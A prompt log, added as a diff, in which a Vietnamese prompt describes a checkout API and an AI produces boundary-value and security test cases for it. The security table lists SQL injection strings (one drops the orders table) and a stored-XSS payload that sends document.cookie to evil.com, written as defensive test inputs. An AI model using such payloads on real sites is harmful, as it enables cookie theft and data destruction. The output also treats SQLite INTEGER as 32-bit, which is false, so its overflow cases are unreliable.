@@ -1,0 +1,322 @@
+prompt_log_02
+prompt:
+/bva-domain-testing 
+# FEATURE TO TEST: 2. Đặt hàng (FR08 - Checkout)
+## 1. Extracted Source Code Context
+* **Endpoint:** `POST /api/checkout`
+* **Authentication Requirement:**
+  * Endpoint được bảo vệ bởi middleware `authenticateToken`.
+  * Người dùng phải đăng nhập hợp lệ để thực hiện checkout.
+  * `userId` được lấy từ `req.user.id`.
+* **Database Constraints (database.js):**
+  * `id` INTEGER PRIMARY KEY AUTOINCREMENT
+  * `user_id` INTEGER
+  * `total_amount` INTEGER
+  * `status` TEXT DEFAULT 'pending'
+  * `shipping_address` TEXT
+  * `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP
+* **Backend Validation Logic (server.js):**
+  * Request Body nhận:
+    * `total_amount`
+    * `shipping_address`
+  * `user_id` được lấy từ access token, không phải từ request body.
+  * Khi tạo đơn hàng:
+    * `status` được gán cố định là `"pending"`.
+  * Thực hiện insert:
+    ```sql
+    INSERT INTO orders (user_id, total_amount, status, shipping_address)
+    VALUES (?, ?, ?, ?)
+    ```
+  * Nếu database error:
+    * Return HTTP 500
+    * Response:
+      ```json
+      {
+        "error": "<error_message>"
+      }
+      ```
+  * Nếu thành công:
+    * Response:
+      ```json
+      {
+        "message": "Checkout successful",
+        "orderId": <generated_id>
+      }
+      ```
+---
+## 2. Input Data Mapping Specification (For AI Agent Skill)
+### Numeric Fields
+| Field        | Min       | Max       | Notes                                                                        |
+| ------------ | --------- | --------- | ---------------------------------------------------------------------------- |
+| total_amount | Undefined | Undefined | INTEGER field. Không tìm thấy validation giới hạn giá trị trong source code. |
+### String Fields & Limits
+| Field            | Required         | Min Length | Max Length | Notes                                           |
+| ---------------- | ---------------- | ---------- | ---------- | ----------------------------------------------- |
+| shipping_address | Unknown          | Undefined  | Undefined  | Không tìm thấy validation trong source code.    |
+| status           | System Generated | N/A        | N/A        | Luôn được gán giá trị `"pending"` khi checkout. |
+### Enum Values
+| Field  | Allowed Values |
+| ------ | -------------- |
+| status | pending        |
+### Inter-field Dependencies
+| Dependency | Rule                                                                    |
+| ---------- | ----------------------------------------------------------------------- |
+| user_id    | Được lấy từ JWT token (`req.user.id`), không được nhập từ request body. |
+| status     | Luôn được hệ thống gán giá trị `"pending"` khi tạo đơn hàng.            |
+| created_at | Tự động sinh bởi database (`CURRENT_TIMESTAMP`).                        |
+| id         | Tự động sinh bởi database (`AUTOINCREMENT`).                            |
+### Error Response Format
+#### Database Error
+Status Code: `500`
+```json
+{
+  "error": "Error message"
+}
+```
+#### Successful Checkout
+Status Code: `200`
+```json
+{
+  "message": "Checkout successful",
+  "orderId": 1
+}
+```
+### Validation Visibility Analysis
+Không tìm thấy trong source code:
+* Validation bắt buộc (`required`) cho `total_amount`
+* Validation bắt buộc (`required`) cho `shipping_address`
+* Validation giá trị âm / bằng 0 của `total_amount`
+* Validation độ dài địa chỉ giao hàng
+* Validation định dạng địa chỉ
+* Validation giới hạn giá trị tối đa của đơn hàng
+Các trường hợp trên cần được đánh dấu là **Unknown / Not Found in Source Code** khi sinh test case.
+AI-output:
+## 1. Feature Variables & Domain Decomposition
+
+**Endpoint:** `POST /api/checkout`
+**Authentication:** Bearer JWT token required (`Authorization: Bearer <token>`)
+
+| Variable | Type | Format | Constraints | Dependencies |
+|----------|------|--------|-------------|--------------|
+| `Authorization` header | STRING | `Bearer <JWT>` | Required. Must be valid, non-expired token. `userId` extracted from `req.user.id` | Gates entire endpoint; missing = 401 |
+| `total_amount` | INTEGER | Whole number | Required: **Unknown**. Min/Max: **Unknown**. No negative/zero validation found. | Stored directly to DB via parameterized INSERT |
+| `shipping_address` | TEXT | Free string | Required: **Unknown**. Min/Max length: **Unknown**. No format validation found. | Stored directly to DB via parameterized INSERT |
+| `user_id` | INTEGER | System-extracted | NOT a request input. Derived from JWT `req.user.id`. | Depends entirely on `Authorization` header validity |
+| `status` | TEXT | Fixed enum | System-hardcoded to `"pending"`. Never from request body. | Always `"pending"` on insert |
+| `created_at` | DATETIME | Auto | DB `CURRENT_TIMESTAMP`. Not a request input. | — |
+| `id` | INTEGER | Auto | DB `AUTOINCREMENT`. Not a request input. | — |
+
+**Fields NOT in scope (system-managed):** `id`, `status`, `created_at`, `user_id`
+
+> **Assumption A1:** `total_amount` is required — an order with no amount is logically meaningless. No explicit validation confirmed in source; behavior on null/missing is **Unknown**.
+
+> **Assumption A2:** `shipping_address` required status is **Unknown**. Tests will cover both absent and present scenarios.
+
+> **Assumption A3:** `total_amount` is a positive integer (≥ 1) by business logic — but no server-side enforcement is confirmed. Zero and negative values will be tested to reveal actual behavior.
+
+> **Assumption A4:** SQLite INTEGER max = 2,147,483,647 (INT32 max). Values beyond this risk overflow or DB rejection.
+
+> **Assumption A5:** Success response uses HTTP 200 (as specified), not 201. Tests will verify this exactly.
+
+> **Assumption A6:** JWT tokens used in tests are valid tokens obtained from a prior login with a seeded user account (e.g., `test@eshop.com`).
+
+---
+
+## 2. BVA Derivation & Rationale (Step-by-Step)
+
+### Variable: `total_amount`
+```
+Type: INTEGER
+No explicit app-level min/max. Logical business min = 1 (can't have zero-value order).
+SQLite INT max = 2,147,483,647
+
+Conservative boundary derivation:
+  Min-1 = 0              → INVALID (zero-value order — logically invalid; behavior Unknown)
+  Min   = 1              → VALID (minimum meaningful order amount)
+  Min+1 = 2              → VALID
+
+  Nominal = 150000        (typical order, e.g., 150,000 VND)
+
+  Max-1 = 2,147,483,646  → VALID (within SQLite INT range)
+  Max   = 2,147,483,647  → VALID (SQLite INT32 max)
+  Max+1 = 2,147,483,648  → INVALID (SQLite INTEGER overflow — behavior Unknown)
+
+Special cases:
+  -1              → INVALID (negative — no business sense; behavior Unknown)
+  -2147483648     → INVALID (INT32 min underflow)
+  null            → INVALID (required field — behavior Unknown)
+  missing field   → INVALID (behavior Unknown)
+  "150000"        → Type mismatch (string instead of integer)
+  1.5             → Type mismatch (float instead of integer)
+  0               → Edge — zero amount, logically invalid (behavior Unknown)
+```
+
+> **Assumption A3 (restated):** Negative and zero values should be rejected by business logic but no validation code was found — tests will document actual behavior.
+
+> **Assumption A7:** SQLite will silently truncate or error on values exceeding INT32 range. The exact behavior (crash vs. 500 vs. auto-truncate) must be verified.
+
+### Variable: `shipping_address`
+```
+Type: TEXT (free string)
+No format, min, or max length constraint found.
+
+Conservative boundary derivation (min=1 char if required):
+  Min-1 = ""           → Edge (empty string — required status Unknown)
+  Min   = "A"          → VALID (1 char minimum)
+  Min+1 = "AB"         → VALID (2 chars)
+
+  Nominal = "123 Nguyen Hue, Quan 1, TPHCM"
+
+  Max: No app limit → stress test at 500 chars and 5000 chars
+  Max (stress) = "<500 x 'A'>"  → VALID (within TEXT)
+  Overflow stress = "<5000 x 'A'>" → VALID (SQLite TEXT unlimited)
+
+Special cases:
+  null / missing     → behavior Unknown (required status not confirmed)
+  spaces only "   " → Edge — meaningful address?
+  Unicode / Vietnamese "Đường Lê Lợi, Quận 1" → VALID
+  XSS payload        → Should sanitize
+  SQL injection      → Should be blocked by parameterized query
+  Emoji "🏠 123 St"  → System-dependent
+```
+
+### Variable: `Authorization` header (JWT Token)
+```
+Type: String (Bearer token)
+Validation: middleware `authenticateToken`
+
+Valid states:
+  Valid token (active session)      → VALID → proceed to checkout
+  
+Invalid states:
+  Missing header entirely           → INVALID → 401 Unauthorized
+  "Bearer " with empty token        → INVALID → 401
+  "Bearer invalid.jwt.token"        → INVALID → 401
+  Expired token                     → INVALID → 401
+  Token of deleted/non-existent user → INVALID → 401/403
+  Token without "Bearer " prefix    → INVALID → 401
+  Tampered token (modified payload) → INVALID → 401
+  Token with role='admin'           → Behavior Unknown (should still create order as admin user)
+```
+
+### Variable: `user_id` (mass assignment attack surface)
+```
+Source: JWT token ONLY (req.user.id). Not from request body.
+
+Attack vector: What if attacker sends `user_id` in request body?
+  body: { user_id: 999, total_amount: 100, shipping_address: "X" }
+  Expected: user_id from body is IGNORED; DB uses token-derived userId only
+  Risk: If server uses body user_id → BOLA/IDOR vulnerability
+```
+
+### Variable: `status` (mass assignment attack surface)
+```
+System-hardcoded to "pending".
+
+Attack vector: Attacker sends `status` in body:
+  body: { total_amount: 100, shipping_address: "X", status: "completed" }
+  Expected: status in body is IGNORED; DB always stores "pending"
+  Risk: If server uses body status → business logic bypass
+```
+
+---
+
+## 3. Comprehensive Test Case Matrix
+
+| Test ID | Title | Preconditions | Inputs (exact values) | Steps | Expected Result | HTTP Status |
+|---------|-------|---------------|----------------------|-------|-----------------|-------------|
+| TC-CHECKOUT-001 | Happy path — valid full checkout | User `test@eshop.com` logged in; valid JWT obtained | Header: `Authorization: Bearer <valid_token>` Body: `{"total_amount": 150000, "shipping_address": "123 Nguyen Hue, Quan 1, TPHCM"}` | POST /api/checkout | `{"message": "Checkout successful", "orderId": <integer>}` — order in DB with status='pending', user_id = test user's id | 200 |
+| TC-CHECKOUT-002 | Happy path — minimum plausible amount | Valid JWT | Header: valid token Body: `{"total_amount": 1, "shipping_address": "A"}` | POST /api/checkout | Checkout successful, orderId returned | 200 |
+| TC-CHECKOUT-003 | Happy path — large valid address string | Valid JWT | Header: valid token Body: `{"total_amount": 50000, "shipping_address": "<500-char string of 'A'>"}` | POST /api/checkout | Checkout successful | 200 |
+| TC-CHECKOUT-004 | No Authorization header | Valid user exists | No `Authorization` header. Body: `{"total_amount": 100, "shipping_address": "ABC"}` | POST /api/checkout | Error: unauthorized / token missing | 401 |
+| TC-CHECKOUT-005 | Invalid JWT token | N/A | Header: `Authorization: Bearer invalid.jwt.xyz` Body: `{"total_amount": 100, "shipping_address": "ABC"}` | POST /api/checkout | Error: invalid token | 401 |
+| TC-CHECKOUT-006 | Expired JWT token | Valid user, expired token | Header: `Authorization: Bearer <expired_token>` Body: `{"total_amount": 100, "shipping_address": "ABC"}` | POST /api/checkout | Error: token expired | 401 |
+| TC-CHECKOUT-007 | Token without "Bearer " prefix | N/A | Header: `Authorization: <valid_token_no_prefix>` Body: `{"total_amount": 100, "shipping_address": "ABC"}` | POST /api/checkout | Error: invalid authorization format | 401 |
+| TC-CHECKOUT-008 | Tampered JWT (modified payload) | N/A | Header: `Authorization: Bearer <token_with_modified_userId>` Body: `{"total_amount": 100, "shipping_address": "ABC"}` | POST /api/checkout | Error: invalid token signature | 401 |
+| TC-CHECKOUT-009 | `total_amount` = 0 (Min-1) | Valid JWT | Body: `{"total_amount": 0, "shipping_address": "123 Main St"}` | POST /api/checkout | **Unknown** — ideally 400 (zero-value order invalid), but behavior not defined in source | 400 / 200 |
+| TC-CHECKOUT-010 | `total_amount` = 1 (Min) | Valid JWT | Body: `{"total_amount": 1, "shipping_address": "123 Main St"}` | POST /api/checkout | Checkout successful | 200 |
+| TC-CHECKOUT-011 | `total_amount` = 2 (Min+1) | Valid JWT | Body: `{"total_amount": 2, "shipping_address": "123 Main St"}` | POST /api/checkout | Checkout successful | 200 |
+| TC-CHECKOUT-012 | `total_amount` = -1 (negative) | Valid JWT | Body: `{"total_amount": -1, "shipping_address": "123 Main St"}` | POST /api/checkout | **Unknown** — ideally 400 (negative amount invalid) | 400 / 200 |
+| TC-CHECKOUT-013 | `total_amount` = -2147483648 (INT underflow) | Valid JWT | Body: `{"total_amount": -2147483648, "shipping_address": "123 Main St"}` | POST /api/checkout | **Unknown** — 400 or DB error 500 | 400 / 500 |
+| TC-CHECKOUT-014 | `total_amount` = 2147483646 (Max-1) | Valid JWT | Body: `{"total_amount": 2147483646, "shipping_address": "123 Main St"}` | POST /api/checkout | Checkout successful | 200 |
+| TC-CHECKOUT-015 | `total_amount` = 2147483647 (INT32 Max) | Valid JWT | Body: `{"total_amount": 2147483647, "shipping_address": "123 Main St"}` | POST /api/checkout | Checkout successful | 200 |
+| TC-CHECKOUT-016 | `total_amount` = 2147483648 (INT32 Max+1, overflow) | Valid JWT | Body: `{"total_amount": 2147483648, "shipping_address": "123 Main St"}` | POST /api/checkout | **Unknown** — DB error 500 or silent truncation | 500 / 400 |
+| TC-CHECKOUT-017 | `total_amount` = null | Valid JWT | Body: `{"total_amount": null, "shipping_address": "123 Main St"}` | POST /api/checkout | **Unknown** — ideally 400 (required field) | 400 / 500 |
+| TC-CHECKOUT-018 | `total_amount` missing from body | Valid JWT | Body: `{"shipping_address": "123 Main St"}` | POST /api/checkout | **Unknown** — ideally 400 | 400 / 500 |
+| TC-CHECKOUT-019 | `total_amount` as string type | Valid JWT | Body: `{"total_amount": "150000", "shipping_address": "123 Main St"}` | POST /api/checkout | **Unknown** — accepted (JS coercion) or 400 (type mismatch) | 200 / 400 |
+| TC-CHECKOUT-020 | `total_amount` as float | Valid JWT | Body: `{"total_amount": 99.99, "shipping_address": "123 Main St"}` | POST /api/checkout | **Unknown** — truncated to 99 or 400 | 200 / 400 |
+| TC-CHECKOUT-021 | `shipping_address` = 1 char (Min) | Valid JWT | Body: `{"total_amount": 100, "shipping_address": "A"}` | POST /api/checkout | Checkout successful | 200 |
+| TC-CHECKOUT-022 | `shipping_address` = empty string | Valid JWT | Body: `{"total_amount": 100, "shipping_address": ""}` | POST /api/checkout | **Unknown** — 400 (empty address) or 200 (no validation) | 400 / 200 |
+| TC-CHECKOUT-023 | `shipping_address` = null | Valid JWT | Body: `{"total_amount": 100, "shipping_address": null}` | POST /api/checkout | **Unknown** — 400 or stored as NULL | 400 / 200 |
+| TC-CHECKOUT-024 | `shipping_address` missing from body | Valid JWT | Body: `{"total_amount": 100}` | POST /api/checkout | **Unknown** — 400 or stored as NULL/undefined | 400 / 200 |
+| TC-CHECKOUT-025 | `shipping_address` = 500 chars (stress) | Valid JWT | Body: `{"total_amount": 100, "shipping_address": "<500 x 'A'>"}` | POST /api/checkout | Checkout successful (no length limit) | 200 |
+| TC-CHECKOUT-026 | `shipping_address` = Vietnamese Unicode | Valid JWT | Body: `{"total_amount": 100, "shipping_address": "45 Đường Lê Lợi, Quận 1, TP.HCM"}` | POST /api/checkout | Checkout successful; UTF-8 stored correctly | 200 |
+| TC-CHECKOUT-027 | Empty body `{}` | Valid JWT | Body: `{}` | POST /api/checkout | **Unknown** — ideally 400 (all fields missing) | 400 / 500 |
+| TC-CHECKOUT-028 | Mass assignment — inject `user_id` in body | Valid JWT (user A) | Body: `{"total_amount": 100, "shipping_address": "X", "user_id": 1}` | POST /api/checkout | Order created with `user_id` from JWT (NOT body). DB record shows correct token owner | 200 |
+| TC-CHECKOUT-029 | Mass assignment — inject `status` in body | Valid JWT | Body: `{"total_amount": 100, "shipping_address": "X", "status": "completed"}` | POST /api/checkout | Order created with `status='pending'` (body value ignored) | 200 |
+| TC-CHECKOUT-030 | Mass assignment — inject `id` in body | Valid JWT | Body: `{"total_amount": 100, "shipping_address": "X", "id": 9999}` | POST /api/checkout | `id` is AUTOINCREMENT; injected value ignored | 200 |
+| TC-CHECKOUT-031 | Mass assignment — inject `created_at` | Valid JWT | Body: `{"total_amount": 100, "shipping_address": "X", "created_at": "2000-01-01"}` | POST /api/checkout | `created_at` = server timestamp; body value ignored | 200 |
+| TC-CHECKOUT-032 | Verify `user_id` binding from token | Two users logged in (User A token, User B exists) | Header: User A's token. Body: `{"total_amount": 100, "shipping_address": "X"}` | POST → check DB | Order's `user_id` = User A's id, NOT User B's | 200 |
+| TC-CHECKOUT-033 | Non-JSON Content-Type | Valid JWT | Header: `Content-Type: text/plain` Body: `total_amount=100&shipping_address=X` | POST /api/checkout | 400 or 415 — invalid content type | 400 / 415 |
+| TC-CHECKOUT-034 | Malformed JSON body | Valid JWT | Raw body: `{total_amount: 100, shipping_address: X}` (unquoted keys) | POST /api/checkout | 400 — JSON parse error | 400 |
+| TC-CHECKOUT-035 | Concurrent checkouts — same user | Valid JWT, user with cart | Two simultaneous POST /api/checkout with same token | Fire 2 requests concurrently | Both create separate orders (each gets unique orderId) | 200 + 200 |
+| TC-CHECKOUT-036 | `total_amount` as boolean `true` | Valid JWT | Body: `{"total_amount": true, "shipping_address": "X"}` | POST /api/checkout | **Unknown** — coerced to 1 or rejected | 200 / 400 |
+| TC-CHECKOUT-037 | Extra unknown fields in body | Valid JWT | Body: `{"total_amount": 100, "shipping_address": "X", "discount": 50, "coupon_code": "FREE"}` | POST /api/checkout | Unknown fields ignored; order created normally | 200 |
+
+---
+
+## 4. AI Gap Analysis & Vulnerability Report
+
+### 4.1 Specification Gaps
+
+| Gap ID | Description | Affected Variables | Risk Level | Recommendation |
+|--------|-------------|-------------------|------------|----------------|
+| GAP-001 | `total_amount` has no required validation — null/missing may silently insert NULL into INTEGER column | `total_amount` | **CRITICAL** | Add server-side: `if (!total_amount) return res.status(400).json({error: "total_amount is required"})` |
+| GAP-002 | No negative value guard on `total_amount` — orders with negative amounts accepted or cause DB errors | `total_amount` | **CRITICAL** | Add: `if (total_amount <= 0) return res.status(400).json({error: "total_amount must be positive"})` |
+| GAP-003 | `total_amount` INTEGER overflow at SQLite INT32 max (2,147,483,647) not handled — may cause 500 | `total_amount` | **HIGH** | Add max validation or use SQLite `REAL` type; catch `SQLITE_INTEGER_OVERFLOW` |
+| GAP-004 | `shipping_address` required status undefined — null/missing address may create unfulfillable orders | `shipping_address` | **HIGH** | Define as required if orders must be shipped; add: `if (!shipping_address) return 400` |
+| GAP-005 | No max length on `shipping_address` — potential DoS via multi-MB address strings | `shipping_address` | **MEDIUM** | Cap at 500 chars in validation middleware |
+| GAP-006 | No type validation for `total_amount` — string `"150000"` may be accepted via JS type coercion | `total_amount` | **MEDIUM** | Add `typeof total_amount !== 'number'` check before insert |
+| GAP-007 | No float rejection for `total_amount` — `99.99` may be silently truncated to `99` by SQLite INTEGER | `total_amount` | **MEDIUM** | Add `!Number.isInteger(total_amount)` guard; or switch column type to REAL for decimal prices |
+| GAP-008 | Error response for missing/invalid required fields is undefined — only DB errors return 500 with body | All fields | **MEDIUM** | Specify 400 response with `{"error": "field_name is required"}` for validation failures |
+| GAP-009 | Concurrent orders from same user have no idempotency key — double-submit creates duplicate orders | `user_id` + `total_amount` | **MEDIUM** | Add idempotency key header or client-side submit lock; deduplicate on (user_id, amount, timestamp within 5s) |
+| GAP-010 | No order limit per user per time window — a user can create unlimited orders programmatically | `user_id` | **LOW** | Add rate limiting (e.g., max 10 orders/minute per user) |
+| GAP-011 | Success response uses HTTP 200 instead of 201 for resource creation — non-standard REST | Response | **LOW** | Return 201 Created with `Location: /api/orders/<orderId>` header |
+
+---
+
+### 4.2 Security Vulnerability Test Cases
+
+| Vuln ID | Category | Test Input | Attack Vector | Expected Safe Response |
+|---------|----------|-----------|---------------|----------------------|
+| SEC-001 | SQL Injection | `shipping_address="' OR '1'='1'; DROP TABLE orders;--"` | `shipping_address` in parameterized INSERT | Parameterized query blocks injection; stored as literal string or 400 |
+| SEC-002 | SQL Injection | `shipping_address="'; INSERT INTO orders (user_id, total_amount, status) VALUES (1, 0, 'completed');--"` | `shipping_address` field | Parameterized query prevents; no second insert executed |
+| SEC-003 | XSS — Stored | `shipping_address="<script>fetch('https://evil.com?c='+document.cookie)</script>"` | `shipping_address` rendered in order management UI | Stored escaped; not executed when displayed |
+| SEC-004 | XSS — Stored | `shipping_address="<img src=x onerror=alert(document.domain)>"` | `shipping_address` in admin order view | Sanitized on output; not executed |
+| SEC-005 | BOLA / Mass Assignment | Body includes `"user_id": <another_user_id>` alongside valid token | `user_id` in request body overriding JWT-derived value | `user_id` from body ignored; order assigned to token owner |
+| SEC-006 | Business Logic Bypass | Body includes `"status": "completed"` or `"status": "shipped"` | `status` field in body bypassing workflow | `status` from body ignored; DB stores `'pending'` always |
+| SEC-007 | Auth Bypass | No `Authorization` header, but body includes `"user_id": 1` | Accessing protected endpoint without auth | 401 Unauthorized; middleware blocks before any DB operation |
+| SEC-008 | JWT Algorithm Confusion | Header: `Authorization: Bearer <token_signed_with_none_algorithm>` | `alg: "none"` JWT attack | 401 Unauthorized; server must reject unsigned tokens |
+| SEC-009 | Integer Overflow DoS | `total_amount: 9999999999999999999` | Oversized integer in amount field | 400 Bad Request or graceful 500; no server crash |
+| SEC-010 | Mass Assignment — Privilege Field | Body: `{"total_amount": 1, "shipping_address": "X", "id": 1, "created_at": "2000-01-01", "status": "refunded"}` | Multiple system-managed fields in body | All ignored; only `total_amount` and `shipping_address` used; `user_id` from token |
+
+---
+
+### 4.3 Enhancement Test Cases (Gap Closure)
+
+| TC ID | Gap Addressed | Title | Exact Input | Expected Result |
+|-------|--------------|-------|-------------|-----------------|
+| TC-CHECKOUT-ENH-001 | GAP-002 | Negative total_amount rejected | `total_amount: -1` | 400 `{"error": "total_amount must be a positive integer"}` |
+| TC-CHECKOUT-ENH-002 | GAP-002 | Zero total_amount rejected | `total_amount: 0` | 400 `{"error": "total_amount must be a positive integer"}` |
+| TC-CHECKOUT-ENH-003 | GAP-001 | Null total_amount rejected | `total_amount: null` | 400 `{"error": "total_amount is required"}` |
+| TC-CHECKOUT-ENH-004 | GAP-006 | String total_amount rejected | `total_amount: "100"` | 400 `{"error": "total_amount must be an integer"}` |
+| TC-CHECKOUT-ENH-005 | GAP-007 | Float total_amount rejected | `total_amount: 99.99` | 400 `{"error": "total_amount must be an integer"}` |
+| TC-CHECKOUT-ENH-006 | GAP-004 | Null shipping_address rejected | `shipping_address: null` | 400 `{"error": "shipping_address is required"}` |
+| TC-CHECKOUT-ENH-007 | GAP-005 | Address > 500 chars rejected | `shipping_address: "<501 x 'A'>"` | 400 `{"error": "shipping_address too long"}` |
+| TC-CHECKOUT-ENH-008 | GAP-009 | Double-submit idempotency | Two identical POSTs within 1 second | 2nd request returns 409 Conflict or same orderId |
+| TC-CHECKOUT-ENH-009 | GAP-003 | INT32 overflow rejected | `total_amount: 2147483648` | 400 `{"error": "total_amount exceeds maximum value"}` |
+| TC-CHECKOUT-ENH-010 | SEC-006 | `status` in body always ignored | `status: "completed"` in body | DB record has `status='pending'`; verified by GET /api/orders |
+
+---
+
+**Summary:** 37 functional test cases + 10 security test cases + 10 enhancement test cases = **57 total test cases** covering all BVA boundaries, authentication states, mass assignment vectors, and integer overflow risks for `POST /api/checkout`.
